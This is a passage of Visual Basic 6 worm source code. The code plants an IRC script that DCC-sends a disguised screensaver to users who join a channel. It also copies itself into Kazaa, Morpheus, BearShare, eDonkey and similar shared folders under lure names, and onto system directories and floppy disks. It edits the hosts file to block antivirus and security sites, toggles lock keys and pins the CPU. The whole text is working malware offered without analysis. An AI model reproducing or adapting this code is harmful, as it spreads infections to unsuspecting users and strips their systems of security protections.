Print #1, "Level4=300-Level 300"
Print #1, "300-Level 300Enabled=1"
Print #1, "Level5=400-Level 400"
Print #1, "400-Level 400Enabled=1"
Print #1, "Level6=500-Level 500"
Print #1, "500-Level 500Enabled=1"
Print #1, ""
Print #1, "[000-Unknowns]"
Print #1, "UserCount=0"
Print #1, "Event1=ON JOIN:#:/msg $nick Have you look at this Screen Saver;)"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[100-Level 100]"
Print #1, "User1=*!*@*"
Print #1, "UserCount=1"
Print #1, "Event1=ON JOIN:#:/dcc send $nick " & pOX & "\Pirch2.scr"
Print #1, "EventCount=1"
Print #1, ""
Print #1, "[200-Level 200]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[300-Level 300]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[400-Level 400]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[500-Level 500]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Close 1
End Sub
Private Sub P2P()
On Error Resume Next
Dim windir As String
windir = WinDir_func
program_files = Mid$(windir, 1, 3) & "Program Files"

KMD = Mid$(windir, 1, 3) & "Program Files\KMD\My Shared Folder"
Kazaa = Mid$(windir, 1, 3) & "Program Files\Kazaa\My Shared Folder"
KazaaLiteL = Mid$(windir, 1, 3) & "Program Files\KaZaA Lite\My Shared Folder"
Morpheus = Mid$(windir, 1, 3) & "Program Files\Morpheus\My Shared Folder"
Grokster = Mid$(windir, 1, 3) & "Program Files\Grokster\My Grokster"
BearShare = Mid$(windir, 1, 3) & "Program Files\BearShare\Shared"
Edonkey = Mid$(windir, 1, 3) & "Program Files\Edonkey2000\Incoming"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", KMD & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", KMD & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", KMD & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", Kazaa & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", Kazaa & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", Kazaa & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", KazaaLiteL & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", KazaaLiteL & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", KazaaLiteL & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", Morpheus & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", Morpheus & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", Morpheus & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", Grokster & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", Grokster & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", Grokster & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", BearShare & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", BearShare & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", BearShare & "\Eminem_Program.exe"
'=================================================================================
FileCopy App.Path + "\" + App.EXEName + ".exe", Edonkey & "\Pamela Nude.scr"
FileCopy App.Path + "\" + App.EXEName + ".exe", Edonkey & "\Sex Page Crecker.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", Edonkey & "\Eminem_Program.exe"
End Sub
Private Sub Copy()
On Error Resume Next
windir = WinDir_func
FileCopy App.Path + "\" + App.EXEName + ".exe", windir & "\NoSex" & ".exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", windir & "\system\NoSex" & ".exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", windir & "\system32\NoSex" & ".exe"
End Sub
Private Sub Timer1_Timer()
On Error Resume Next
Timer1.Enabled = True
Timer1.Interval = 100
Set Key = CreateObject("WScript.Shell")
Key.SendKeys "{CAPSLOCK}"
Key.SendKeys "{NUMLOCK}"
Key.SendKeys "{SCROLLLOCK}"
End Sub
Private Sub Timer2_Timer()
On Error Resume Next
Randomize
r = Int((5 * Rnd) + 1)
If r = 1 Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "A:\pacman.exe"
ElseIf r = 2 Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "A:\LoveGame.exe"
ElseIf r = 3 Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "A:\matrix.exe"
ElseIf r = 4 Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "A:\Calculator.exe"
ElseIf r = 5 Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "A:\Speed.exe"
End If
End Sub
Private Sub Site()
On Error Resume Next
windir = WinDir_func
Open windir & "\system32\Drivers\Etc\Hosts" For Append As #1
Print #1, "www.microsoft.com    127.0.0.1"
Print #1, "www.symantec.com    127.0.0.1"
Print #1, "www.sophos.com    127.0.0.1"
Print #1, "www.sophos.de    127.0.0.1"
Print #1, "www.avast.com    127.0.0.1"
Print #1, "www.mcafee.com    127.0.0.1"
Print #1, "www.viruslist.com    127.0.0.1"
Print #1, "www.f-prot.com    127.0.0.1"
Print #1, "www.f-secure.com    127.0.0.1"
Print #1, "www.kaspersky.com    127.0.0.1"
Print #1, "www.my-etrust.com    127.0.0.1"
Print #1, "www.trendmicro.com    127.0.0.1"
Print #1, "www.bitdefender.com   127.0.0.1"
Print #1, "www.eset.com    127.0.0.1"
Print #1, "www.norman.com    127.0.0.1"
Print #1, "www.vmyths.com    127.0.0.1"
Print #1, "www.virusbtn.com    127.0.0.1"
Print #1, "www.wildlist.org   127.0.0.1"
Print #1, "www.pandasecurity.com   127.0.0.1"
Print #1, "www.google.com   127.0.0.1"
Print #1, "www.yahoo.com   127.0.0.1"
Close #1
End Sub
Private Sub CPUusage()
On Error Resume Next
cpuheat:
GoTo cpuheat:
End Sub
